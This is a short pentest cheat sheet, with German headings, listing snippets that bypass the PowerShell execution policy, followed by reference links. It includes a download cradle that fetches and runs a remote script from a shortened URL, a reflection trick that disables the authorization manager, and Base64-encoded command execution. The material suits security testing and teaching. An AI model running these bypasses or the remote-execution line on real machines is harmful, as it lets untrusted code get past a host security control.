# Powershell ExecutionPolicy Bypass

```powershell
Echo Write-Host "My voice is my passport, verify me."  | PowerShell.exe -noprofile -
Get-Content .runme.ps1 | PowerShell.exe -noprofile - 
TYPE .runme.ps1 | PowerShell.exe -noprofile -
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
Powershell -c "Write-Host 'My voice is my passport, verify me.'"

$command = "Write-Host 'My voice is my passport, verify me.'" 
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encodedCommand

invoke-command -scriptblock {Write-Host "My voice is my passport, verify me."}
Get-Content .runme.ps1 | Invoke-Expression
GC .runme.ps1 | iex
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
PowerShell.exe -ExecutionPolicy UnRestricted -File .runme.ps1
PowerShell.exe -ExecutionPolicy Remote-signed -File .runme.ps1 # siehe http://www.darkoperator.com/blog/2013/3/5/powershell-basics-execution-policy-part-1.html

function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}
Disable-ExecutionPolicy
./runme.ps1

Set-ExecutionPolicy Bypass -Scope Process
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
# edit HKEY_CURRENT_USER\Software\MicrosoftPowerShell\1\ShellIds\Microsoft.PowerShell
```
## Referenzen
[Vollständiger Blogpost](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
http://blogs.msdn.com/b/powershell/archive/2008/09/30/powershell-s-security-guiding-principles.aspx
http://obscuresecurity.blogspot.com/2011/08/powershell-executionpolicy.html
http://roo7break.co.uk/?page_id=611
http://technet.microsoft.com/en-us/library/hh849694.aspx
http://technet.microsoft.com/en-us/library/hh849812.aspx
http://technet.microsoft.com/en-us/library/hh849893.aspx
http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
http://www.hanselman.com/blog/SigningPowerShellScripts.aspx
http://www.darkoperator.com/blog/2013/3/5/powershell-basics-execution-policy-part-1.html
http://www.nivot.org/blog/post/2012/02/10/Bypassing-Restricted-Execution-Policy-in-Code-or-in-Scriptfrom
http://www.powershellmagazine.com/2014/07/08/powersploit/

tags: #powershell #snippets #pentest #windows 
